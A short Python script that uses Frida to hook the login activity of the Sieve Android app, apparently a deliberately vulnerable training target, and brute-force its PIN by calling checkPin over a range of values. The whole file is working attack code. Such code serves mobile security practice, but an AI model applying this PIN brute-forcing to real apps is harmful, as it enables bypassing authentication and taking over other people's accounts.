import frida, sys

def on_message(message, data):
    if message['type'] == 'send':
        print("[*] {0}".format(message['payload']))
    else:
        print(message)

jscode = """
Java.perform(function () {
    var ShortLoginActivity = Java.use('com.mwr.example.sieve.ShortLoginActivity');
    ShortLoginActivity.submit.implementation = function(v){
		var service=this.serviceConnection.value
        for(var i=1225; i<1240; i++)
			{
				service.checkPin(i+"");
				send(i + ": ");
			}
        console.log('Done:');
    };
});
"""

process = frida.get_usb_device().attach('com.mwr.example.sieve')
script = process.create_script(jscode)
script.on('message', on_message)
script.load()
sys.stdin.read()
